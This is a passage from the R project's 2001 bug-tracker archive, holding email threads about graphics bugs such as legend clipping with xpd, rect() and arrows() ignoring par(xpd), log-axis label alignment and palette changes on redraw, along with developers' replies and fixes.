R> split.screen (c(1,2))
[1] 1 2
R> # Draw 10000 points to make the effect obvious
R> screen (1)
R> plot (1:10000, 1:10000, main="1")
R> screen (2)
R> plot (1:10000, 1:10000, main="2")
R> # Ok, go back to screen 1, draw plots 3 and 4
R> screen (1)
R> plot (1:10000, 10000:1, main="3")
R> screen (2)
R> plot (1:10000, 10000:1, main="4")
R> 
R> ########################################
R> # NOW lower/raise window, do something to force device to redraw itself.
R> # You'll see again plot 1 (!), 2 (!), 3, and 4.  Why 1 and 2?
R> ########################################
R> 
R> # Here's how to erase screen 2 from screen 1 (!)
R> screen (1)
R> plot (1:10, 1:10, main="3a")
R> ########################################
R> # The following plot will erase screen 2
R> ########################################
R> plot (1:10, 1:10, main="3b")
R> 
R> # The good news is that this resets the list of graphic ops:
R> screen (2)
R> plot (1:10, 1:10, main="4")
R> # Now if you touch the window, you'll see only plot 3b and 4.

Regards,
  -tom

R> R.version
         _                   
platform sparc-sun-solaris2.7
arch     sparc               
os       solaris2.7          
system   sparc, solaris2.7   
status   Patched             
major    1                   
minor    2.1                 
year     2001                
month    01                  
day      31                  
language R                   

-- 
mailto:tov@ece.cmu.edu (Tom Vogels)   Tel: (412) 268-6638   FAX: -3204


==> 837.audit <==
Wed Feb  7 08:51:14 2001	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 887 *
Subject: axis(adj=anything) has no effect
From: jhallman@frb.gov
Date: Wed, 28 Mar 2001 20:51:05 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 887 <==
From jhallman@frb.gov  Wed Mar 28 20:51:06 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA23265
	for <R-bugs@biostat.ku.dk>; Wed, 28 Mar 2001 20:51:05 +0200 (MET DST)
Date: Wed, 28 Mar 2001 20:51:05 +0200 (MET DST)
From: jhallman@frb.gov
Message-Id: <200103281851.UAA23265@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: axis(adj=anything) has no effect

Full_Name: Jeff Hallman
Version: 1.2.2
OS: SunOS5.6
Submission from: (NULL) (132.200.32.33)


Giving an adj argument to axis() seems to have no effect.  In Splus, adj = 0 
left-justifies the labels under the ticks, adj = 1 right justifies them, and 
numbers in between can also be used.  I like to use adj = 0.9 to get something
that looks like this:

-----------+-----------+-----------+------------+---------
        1980        1981        1982         1983

as an axis for a plot of monthly time series data.



==> 887.audit <==
Sat Apr  7 10:29:17 2001	ripley	moved from incoming to Graphics

==> 887.followup.1 <==
From paul@stat.auckland.ac.nz  Tue Jun 19 06:05:35 2001
Received: from mailhost.auckland.ac.nz (mailhost.auckland.ac.nz [130.216.191.4] (may be forged))
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA16140
	for <R-bugs@biostat.ku.dk>; Tue, 19 Jun 2001 06:05:33 +0200 (MET DST)
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id QAA00412;
	Tue, 19 Jun 2001 16:05:26 +1200 (NZST)
Received: from murrell (murrell.stat.auckland.ac.nz [130.216.93.23])
	by stat1.stat.auckland.ac.nz (8.9.3+Sun/8.8.8) with SMTP id QAA24826;
	Tue, 19 Jun 2001 16:05:25 +1200 (NZST)
Message-ID: <020401c0f877$becbd540$175dd882@stat.auckland.ac.nz>
From: "Paul Murrell" <paul@stat.auckland.ac.nz>
To: <r-core@r-project.org>
Cc: <R-bugs@biostat.ku.dk>
Subject: Re: axis(adj=anything) has no effect (PR#887)
Date: Tue, 19 Jun 2001 16:24:35 +1200
MIME-Version: 1.0
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 5.50.4522.1200
X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1200

Hi

----Bug summary:----
Giving an adj argument to axis() seems to have no effect.  In Splus, adj = 0
left-justifies the labels under the ticks, adj = 1 right justifies them, and
numbers in between can also be used.  I like to use adj = 0.9 to get
something
that looks like this:

-----------+-----------+-----------+------------+---------
        1980        1981        1982         1983

as an axis for a plot of monthly time series data.
----Bug summary:----


Are missing features bugs or wish-list items ?

Paul


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 943 *
Subject: legend() with xpd=T; omission of initial plot character
From: John Maindonald <john.maindonald@anu.edu.au>
Date: Sun, 20 May 2001 10:35:16 +1000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 943 <==
From postmaster@franz.stat.wisc.edu  Sun May 20 02:32:40 2001
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id CAA02494
	for <r-bugs@biostat.ku.dk>; Sun, 20 May 2001 02:32:39 +0200 (MET DST)
Received: from mail.anu.edu.au (really [150.203.2.7]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m151H95-000JH8C@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Sat, 19 May 2001 19:32:31 -0500 (CDT) 
Received: from anugpo.anu.edu.au (anugpo.anu.edu.au [150.203.2.6])
	by mail.anu.edu.au (8.9.3/8.9.3) with ESMTP id KAA18515
	for <r-bugs@r-project.org>; Sun, 20 May 2001 10:32:27 +1000 (EST)
Received: from soda.anu.edu.au (soda.anu.edu.au [150.203.33.17])
	by anugpo.anu.edu.au (8.9.3+Sun/8.9.3) with ESMTP id KAA22405
	for <r-bugs@r-project.org>; Sun, 20 May 2001 10:32:27 +1000 (EST)
Message-Id: <5.0.2.1.1.20010520103337.00ac8b10@pophost.anu.edu.au>
X-Sender: u9801539@pophost.anu.edu.au (Unverified)
X-Mailer: QUALCOMM Windows Eudora Version 5.0.2
Date: Sun, 20 May 2001 10:35:16 +1000
To: r-bugs@r-project.org
From: John Maindonald <john.maindonald@anu.edu.au>
Subject: legend() with xpd=T; omission of initial plot character
Mime-Version: 1.0
Content-Type: text/plain; charset="us-ascii"; format=flowed


In the following:

plot(0:1, 0:1)
legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))

the first plot character is omitted when plotting to
the screen.

I obtained the same behaviour when placing a legend
in the margin following use of pairs()

-please do not edit the information below--

Version:
  platform = i386-pc-mingw32
  arch = x86
  os = Win32
  system = x86, Win32
  status =
  major = 1
  minor = 2.3
  year = 2001
  month = 04
  day = 26
  language = R

Windows 98 SE 4.10 (build 2222)  A

Search Path:
  .GlobalEnv, package:ctest, Autoloads, package:base
John Maindonald               email : john.maindonald@anu.edu.au
Statistical Consulting Unit,  phone : (6125)3998
c/o CMA, SMS,                 fax   : (6125)5549
John Dedman Mathematical Sciences Building
Australian National University
Canberra ACT 0200
Australia


==> 943.reply.1 <==
From: paul@stat.auckland.ac.nz
To: r-core@r-project.org
Subject: Re: legend() with xpd=T; omission of initial plot character (PR#943)
Date: Tue Jun 19 05:58:40 2001
CC: r-bugs@r-project.org; john.maindonald@anu.edu.au

Hi

Bug summary:----
par(xpd=T)
plot(0:1, 0:1)
legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))

the first plot character is omitted when plotting to
the screen.
Bug summary:----

I cannot reproduce this bug, BUT it did show up a bug in rect() -- in the
example above, the border around the legend is not drawn.

This is because rect() ignores par(xpd).  The default is rect(xpd=FALSE).  This
is at odds with text(xpd=NULL) and polygon(xpd=NULL) which use par(xpd) by
default.  arrows(xpd=FALSE) has the same problem as rect().  

I propose modifying rect() and arrows() to use par(xpd) by default like text()
and polygon().  There will, as usual, be a small risk that someone's code will
produce different output after this change, but this risk should be pretty
small.

Any objections ... ?

Paul

==> 943.followup.1 <==
From postmaster@franz.stat.wisc.edu  Tue Jun 19 05:56:22 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id FAA16092
	for <r-bugs@biostat.ku.dk>; Tue, 19 Jun 2001 05:56:21 +0200 (MET DST)
Received: from pubhealth.ku.dk (really [130.225.108.10]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15CCch-000JGhC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Mon, 18 Jun 2001 22:56:15 -0500 (CDT) 
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id FAA16087;
	Tue, 19 Jun 2001 05:55:27 +0200 (MET DST)
From: paul@stat.auckland.ac.nz
Received: from blueberry.kubism.ku.dk (blueberry.kubism.ku.dk [130.225.108.193])
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) with ESMTP id FAA32381;
	Tue, 19 Jun 2001 05:58:35 +0200
Date: Tue, 19 Jun 2001 05:58:35 +0200
Message-Id: <200106190358.FAA32381@blueberry.kubism.ku.dk>
To: r-core@r-project.org
Subject: Re: legend() with xpd=T; omission of initial plot character (PR#943)
CC: r-bugs@r-project.org;john.maindonald@anu.edu.au;;;
X-Loop: R-bugs@biostat.ku.dk

Hi

Bug summary:----
par(xpd=T)
plot(0:1, 0:1)
legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))

the first plot character is omitted when plotting to
the screen.
Bug summary:----

I cannot reproduce this bug, BUT it did show up a bug in rect() -- in the
example above, the border around the legend is not drawn.

This is because rect() ignores par(xpd).  The default is rect(xpd=FALSE).  This
is at odds with text(xpd=NULL) and polygon(xpd=NULL) which use par(xpd) by
default.  arrows(xpd=FALSE) has the same problem as rect().  

I propose modifying rect() and arrows() to use par(xpd) by default like text()
and polygon().  There will, as usual, be a small risk that someone's code will
produce different output after this change, but this risk should be pretty
small.

Any objections ... ?

Paul


==> 943.reply.2 <==
From postmaster@franz.stat.wisc.edu  Tue Jun 19 08:43:07 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA16819
	for <r-bugs@biostat.ku.dk>; Tue, 19 Jun 2001 08:43:07 +0200 (MET DST)
Received: from stat.math.ethz.ch (really [129.132.58.23]) by franz.stat.wisc.edu
	via smail with esmtp (ident daemon using rfc1413)
	id <m15CFDy-000JJWC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Tue, 19 Jun 2001 01:42:54 -0500 (CDT) 
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id IAA02705;
	Tue, 19 Jun 2001 08:42:52 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa000eE; Tue Jun 19 08:42:50 2001
Received: (maechler@localhost) by lynne.ethz.ch (8.9.3/D-MATH-client) id IAA08111; Tue, 19 Jun 2001 08:42:50 +0200
X-Authentication-Warning: lynne.ethz.ch: maechler set sender to maechler@stat.math.ethz.ch using -f
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15150.62570.490993.741070@gargle.gargle.HOWL>
Date: Tue, 19 Jun 2001 08:42:50 +0200
To: paul@stat.auckland.ac.nz
Cc: r-bugs@r-project.org, john.maindonald@anu.edu.au
Subject: Re: legend() with xpd=T; omission of initial plot character (PR#943)
In-Reply-To: <200106190358.FAA32381@blueberry.kubism.ku.dk>
References: <200106190358.FAA32381@blueberry.kubism.ku.dk>
X-Mailer: VM 6.92 under Emacs 20.7.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

>>>>> "Paul" == Paul Murrell <paul@stat.auckland.ac.nz> writes:

    Paul> Hi
    Paul> Bug summary:----
    Paul> par(xpd=T)
    Paul> plot(0:1, 0:1)
    Paul> legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))

    Paul> the first plot character is omitted when plotting to
    Paul> the screen.
    Paul> Bug summary:----

    Paul> I cannot reproduce this bug, BUT it did show up a bug in rect()
    Paul> -- in the example above, the border around the legend is not
    Paul> drawn.

Coincidence, I *did* look at that bug only yesterday.
My experience:
   I *could* reproduce the bug {X11(), Linux-386}, but only a few times. 
   Then, it didn't show anymore. Even restarting R wouldn't show it again.
   My ``explanation'' was that it might be (a bug) inside X11 / Window manager
   handling of things... ??


    Paul> This is because rect() ignores par(xpd).  The default is
    Paul> rect(xpd=FALSE).  This is at odds with text(xpd=NULL) and
    Paul> polygon(xpd=NULL) which use par(xpd) by default.
    Paul> arrows(xpd=FALSE) has the same problem as rect().

    Paul> I propose modifying rect() and arrows() to use par(xpd) by
    Paul> default like text() and polygon().  There will, as usual, be a
    Paul> small risk that someone's code will produce different output
    Paul> after this change, but this risk should be pretty small.

    Paul> Any objections ... ?

not at all, but please fix  abline(*) at the same time.
It doesn't obey xpd either (PR#750).

Martin

==> 943.reply.3 <==
From: paul murrell <R-bugs@biostat.ku.dk>
To: paul@stat.auckland.ac.nz
Subject: Re: legend() with xpd=T; omission of initial plot character (PR#943)
Date: Tue Jul 17 04:28:44 2001
CC: John Maindonald <john.maindonald@anu.edu.au>

Hi


> Bug summary:----
> par(xpd=T)
> plot(0:1, 0:1)
> legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))
> 
> the first plot character is omitted when plotting to
> the screen.
> Bug summary:----
> 
> I cannot reproduce this bug, BUT it did show up a bug in rect() -- in the
> example above, the border around the legend is not drawn.


Still can't reproduce original bug, so no progress there.


> This is because rect() ignores par(xpd).  The default is rect(xpd=FALSE). 
This
> is at odds with text(xpd=NULL) and polygon(xpd=NULL) which use par(xpd) by
> default.  arrows(xpd=FALSE) has the same problem as rect().  
> 
> I propose modifying rect() and arrows() to use par(xpd) by default like
text()
> and polygon().  There will, as usual, be a small risk that someone's code
will
> produce different output after this change, but this risk should be pretty
> small.


Both of these changes made now (for 1.3.1).  
The following code should demonstrate the bugs (in pre-1.3.1 R) and the fixes:

par(mfrow=c(2,1), xpd=FALSE)
plot(1:10)
plot(1:10)
# rect() and arrow() ignored par(xpd=)
rect(1, 9, 2, 20, col="red")
arrows(1.5, 20, 1.5, 10)
par(xpd=TRUE)
rect(3, 9, 4, 20, col="blue")
arrows(3.5, 20, 3.5, 10)
par(xpd=NA)
rect(5, 9, 6, 20, col="green")
arrows(5.5, 20, 5.5, 10)

Paul


==> 943.audit <==
Mon May 21 08:54:07 2001	ripley	moved from incoming to Graphics
Tue Jun 19 05:58:40 2001	paul	sent reply 1
Tue Jul 17 04:28:44 2001	paul	sent reply 3

==> 943.followup.2 <==
From MAILER-DAEMON  Tue Jul 17 04:21:22 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id EAA16216
	for <R-bugs@biostat.ku.dk>; Tue, 17 Jul 2001 04:21:21 +0200 (MET DST)
Received: from localhost (localhost)
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) with internal id EAA21901;
	Tue, 17 Jul 2001 04:28:45 +0200
Date: Tue, 17 Jul 2001 04:28:45 +0200
From: Mail Delivery Subsystem <MAILER-DAEMON@pubhealth.ku.dk>
Message-Id: <200107170228.EAA21901@blueberry.kubism.ku.dk>
To: <R-bugs@biostat.ku.dk>
MIME-Version: 1.0
Content-Type: multipart/report; report-type=delivery-status;
	boundary="EAA21901.995336925/blueberry.kubism.ku.dk"
Subject: Returned mail: User unknown
Auto-Submitted: auto-generated (failure)

This is a MIME-encapsulated message

--EAA21901.995336925/blueberry.kubism.ku.dk

The original message was received at Tue, 17 Jul 2001 04:28:44 +0200
from blueberry.kubism.ku.dk [130.225.108.193]

   ----- The following addresses had permanent fatal errors -----
<John>
    (expanded from: <John>)
<Maindonald>
    (expanded from: <Maindonald>)

   ----- Transcript of session follows -----
... while talking to mail.kubism.ku.dk.:
>>> RCPT To:<maindonald@mail.kubism.ku.dk>
<<< 550 <maindonald@mail.kubism.ku.dk>... User unknown
550 <Maindonald>... User unknown
>>> RCPT To:<john@mail.kubism.ku.dk>
<<< 550 <john@mail.kubism.ku.dk>... User unknown
550 <John>... User unknown

--EAA21901.995336925/blueberry.kubism.ku.dk
Content-Type: message/delivery-status

Reporting-MTA: dns; blueberry.kubism.ku.dk
Received-From-MTA: DNS; blueberry.kubism.ku.dk
Arrival-Date: Tue, 17 Jul 2001 04:28:44 +0200

Final-Recipient: RFC822; john@blueberry.kubism.ku.dk
X-Actual-Recipient: RFC822; john@mail.kubism.ku.dk
Action: failed
Status: 5.1.1
Remote-MTA: DNS; mail.kubism.ku.dk
Diagnostic-Code: SMTP; 550 <john@mail.kubism.ku.dk>... User unknown
Last-Attempt-Date: Tue, 17 Jul 2001 04:28:44 +0200

Final-Recipient: RFC822; maindonald@blueberry.kubism.ku.dk
X-Actual-Recipient: RFC822; maindonald@mail.kubism.ku.dk
Action: failed
Status: 5.1.1
Remote-MTA: DNS; mail.kubism.ku.dk
Diagnostic-Code: SMTP; 550 <maindonald@mail.kubism.ku.dk>... User unknown
Last-Attempt-Date: Tue, 17 Jul 2001 04:28:44 +0200

--EAA21901.995336925/blueberry.kubism.ku.dk
Content-Type: message/rfc822

Return-Path: <R-bugs@biostat.ku.dk>
Received: from blueberry.kubism.ku.dk (blueberry.kubism.ku.dk [130.225.108.193])
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) with ESMTP id EAA21899;
	Tue, 17 Jul 2001 04:28:44 +0200
Date: Tue, 17 Jul 2001 04:28:44 +0200
Message-Id: <200107170228.EAA21899@blueberry.kubism.ku.dk>
From: paul murrell <R-bugs@biostat.ku.dk>
To: paul@stat.auckland.ac.nz
Subject: Re: legend() with xpd=T; omission of initial plot character (PR#943)
CC: John Maindonald <john.maindonald@anu.edu.au>
X-Loop: R-bugs@biostat.ku.dk

Hi


> Bug summary:----
> par(xpd=T)
> plot(0:1, 0:1)
> legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))
> 
> the first plot character is omitted when plotting to
> the screen.
> Bug summary:----
> 
> I cannot reproduce this bug, BUT it did show up a bug in rect() -- in the
> example above, the border around the legend is not drawn.


Still can't reproduce original bug, so no progress there.


> This is because rect() ignores par(xpd).  The default is rect(xpd=FALSE). 
This
> is at odds with text(xpd=NULL) and polygon(xpd=NULL) which use par(xpd) by
> default.  arrows(xpd=FALSE) has the same problem as rect().  
> 
> I propose modifying rect() and arrows() to use par(xpd) by default like
text()
> and polygon().  There will, as usual, be a small risk that someone's code
will
> produce different output after this change, but this risk should be pretty
> small.


Both of these changes made now (for 1.3.1).  
The following code should demonstrate the bugs (in pre-1.3.1 R) and the fixes:

par(mfrow=c(2,1), xpd=FALSE)
plot(1:10)
plot(1:10)
# rect() and arrow() ignored par(xpd=)
rect(1, 9, 2, 20, col="red")
arrows(1.5, 20, 1.5, 10)
par(xpd=TRUE)
rect(3, 9, 4, 20, col="blue")
arrows(3.5, 20, 3.5, 10)
par(xpd=NA)
rect(5, 9, 6, 20, col="green")
arrows(5.5, 20, 5.5, 10)

Paul



--EAA21901.995336925/blueberry.kubism.ku.dk--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 997 *
Subject:  las=1 with log axis 
From: Peter Dalgaard BSA <pd@pubhealth.ku.dk>
Date: Wed, 27 Jun 2001 11:54:06 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 997 <==
From postmaster@franz.stat.wisc.edu  Wed Jun 27 11:50:00 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA01987
	for <r-bugs@biostat.ku.dk>; Wed, 27 Jun 2001 11:49:59 +0200 (MET DST)
Received: from pubhealth.ku.dk (really [130.225.108.10]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15FBxI-000JJjC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Wed, 27 Jun 2001 04:49:52 -0500 (CDT) 
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA01969;
	Wed, 27 Jun 2001 11:49:40 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) id LAA25776;
	Wed, 27 Jun 2001 11:54:06 +0200
Date: Wed, 27 Jun 2001 11:54:06 +0200
From: Peter Dalgaard BSA <pd@pubhealth.ku.dk>
Message-Id: <200106270954.LAA25776@blueberry.kubism.ku.dk>
To: r-bugs@r-project.org
Subject:  las=1 with log axis 
Cc: pd@pubhealth.ku.dk

This just came in:

plot(c(0.1,100),log="y", las=1)

(Numbers and tick marks are unaligned)

Same thing with mtext(), try

mtext("x",2,at=0.1)
mtext("x",2,at=0.1,las=1)

--please do not edit the information below--

Version:
 platform = i586-pc-linux-gnu
 arch = i586
 os = linux-gnu
 system = i586, linux-gnu
 status = 
 major = 1
 minor = 3.0
 year = 2001
 month = 06
 day = 22
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base

==> 997.followup.1 <==
From paul@stat.auckland.ac.nz  Fri Jun 29 00:19:03 2001
Received: from mailhost.auckland.ac.nz (mailhost.auckland.ac.nz [130.216.1.4] (may be forged))
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id AAA21935;
	Fri, 29 Jun 2001 00:19:01 +0200 (MET DST)
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id KAA24932;
	Fri, 29 Jun 2001 10:18:52 +1200 (NZST)
Received: from murrell (murrell.stat.auckland.ac.nz [130.216.93.23])
	by stat1.stat.auckland.ac.nz (8.9.3+Sun/8.8.8) with SMTP id KAA25180;
	Fri, 29 Jun 2001 10:18:52 +1200 (NZST)
Message-ID: <00fc01c10023$19a40700$175dd882@stat.auckland.ac.nz>
From: "Paul Murrell" <paul@stat.auckland.ac.nz>
To: <pd@pubhealth.ku.dk>, <r-devel@stat.math.ethz.ch>
Cc: <R-bugs@biostat.ku.dk>
References: <200106270950.LAA01997@pubhealth.ku.dk>
Subject: Re: [Rd] las=1 with log axis (PR#997)
Date: Fri, 29 Jun 2001 10:38:49 +1200
MIME-Version: 1.0
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 5.50.4522.1200
X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1200

Hi


> This just came in:
>
> plot(c(0.1,100),log="y", las=1)
>
> (Numbers and tick marks are unaligned)
>
> Same thing with mtext(), try
>
> mtext("x",2,at=0.1)
> mtext("x",2,at=0.1,las=1)


This is related to bug #865, which I have discovered is a problem with some
of the very basic transformation code in R graphics (for transforming widths
or heights when there are log scales).  I have a fix for this particular
mtext() problem, but I'm still working on the more general transformation
bug.

Paul



==> 997.reply.1 <==
From: paul murrell <R-bugs@biostat.ku.dk>
To: pd@pubhealth.ku.dk
Subject: Re: las=1 with log axis (PR#997)
Date: Tue Jul 17 06:05:49 2001

Hi


> plot(c(0.1,100),log="y", las=1)
> 
> (Numbers and tick marks are unaligned)
> 
> Same thing with mtext(), try
> 
> mtext("x",2,at=0.1)
> mtext("x",2,at=0.1,las=1)


This is now fixed (which also fixes PR#865).
Also fixed for mtext() when side=1, log="x", and las=2 (and for corresponding
siutations on sides 3 and 4).
Also fixed for mtext() when text is an expression (i.e., mathematical
annotation).

Unfortunately, the problem goes pretty deep -- it is to do with transformation
of widths and heights to or from USER coordinates when the axis is logged. 
There are a couple of other places where this causes a problem:
(i) strwidth() and strheight() 
(ii) symbols()

I'm leaving this bug active until these other issues are resolved.

Paul


==> 997.audit <==
Sat Jun 30 08:57:44 2001	ripley	moved from incoming to Graphics
Tue Jul 17 06:05:49 2001	paul	sent reply 1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1045 *
Subject: Palette changes on redraw
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 08 Aug 2001 19:08:01 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1045 <==
From postmaster@franz.stat.wisc.edu  Wed Aug  8 19:07:59 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA11349
	for <r-bugs@biostat.ku.dk>; Wed, 8 Aug 2001 19:07:58 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (really [130.225.108.193]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15UWoD-000JIvC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Wed, 8 Aug 2001 12:07:53 -0500 (CDT) 
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.2/8.11.2) id f78H81o29218;
	Wed, 8 Aug 2001 19:08:01 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
Sender: pd@pubhealth.ku.dk
To: r-bugs@r-project.org
Subject: Palette changes on redraw
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 08 Aug 2001 19:08:01 +0200
Message-ID: <x2snf2zdhq.fsf@blueberry.kubism.ku.dk>
Lines: 14
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

Try this

example(palette)

then trigger a redraw e.g. by resizing the window. Shouldn't the
palette be stored as part of the display list?

(This only happens because the palette was reset at the end of the
example, but still...)
-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1045.reply.1 <==
From ihaka@stat.auckland.ac.nz  Wed Aug  8 22:36:29 2001
Received: from mailhost.auckland.ac.nz (mailhost.auckland.ac.nz [130.216.1.4] (may be forged))
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA12009;
	Wed, 8 Aug 2001 22:36:26 +0200 (MET DST)
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id IAA21626;
	Thu, 9 Aug 2001 08:36:20 +1200 (NZST)
Received: from stat.auckland.ac.nz (g.ihaka.slip.auckland.ac.nz [130.216.9.243])
	by stat1.stat.auckland.ac.nz (8.10.2+Sun/8.8.8) with ESMTP id f78KaJ720404;
	Thu, 9 Aug 2001 08:36:19 +1200 (NZST)
Sender: ihaka@stat.auckland.ac.nz
Message-ID: <3B71A31A.8BB29F85@stat.auckland.ac.nz>
Date: Thu, 09 Aug 2001 08:37:46 +1200
From: Ross Ihaka <ihaka@stat.auckland.ac.nz>
Organization: University of Auckland
X-Mailer: Mozilla 4.76 [en] (X11; U; Linux 2.2.12 i386)
X-Accept-Language: en
MIME-Version: 1.0
To: p.dalgaard@biostat.ku.dk
CC: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Palette changes on redraw (PR#1045)
References: <200108081708.TAA11359@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

p.dalgaard@biostat.ku.dk wrote:
> 
> Try this
> 
> example(palette)
> 
> then trigger a redraw e.g. by resizing the window. Shouldn't the
> palette be stored as part of the display list?
> 
> (This only happens because the palette was reset at the end of the
> example, but still...)

I could argue either way on this.

I agree that its nasty to have plot colours change in mid-stream,
but I suspect that adding the palette to the display list may not
be the "right" solution.

A different approach would be to map the colour indices (and names)
to RGB values at a slightly higher level.  That way it would be the
RGB values which would be captured in the display list, not the
indices.

[ I'm afraid that I think that the whole display list mechanism is
  "wrong".  We need a much higher level way of describing plots. ]

	Ross

==> 1045.audit <==
Sat Aug 11 09:57:42 2001	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1147 *
Subject: postscript problem
From: kjetil halvorsen <kjetilh@umsanet.edu.bo>
Date: Fri, 26 Oct 2001 15:23:45 -0400
--This seems to be a problem with screen/layout rather than postscript.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1147 <==
From postmaster@franz.stat.wisc.edu  Fri Oct 26 21:23:17 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA03528
	for <r-bugs@biostat.ku.dk>; Fri, 26 Oct 2001 21:23:16 +0200 (MET DST)
Received: from jupiter.umsanet.edu.bo (really [166.114.17.11]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15xCZT-000JIvC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Fri, 26 Oct 2001 14:23:11 -0500 (CDT) 
Received: from umsanet.edu.bo (pc69.umsanet.edu.bo [166.114.17.69])
	by jupiter.umsanet.edu.bo (8.11.0/8.9.3) with ESMTP id f9QJZjK01812
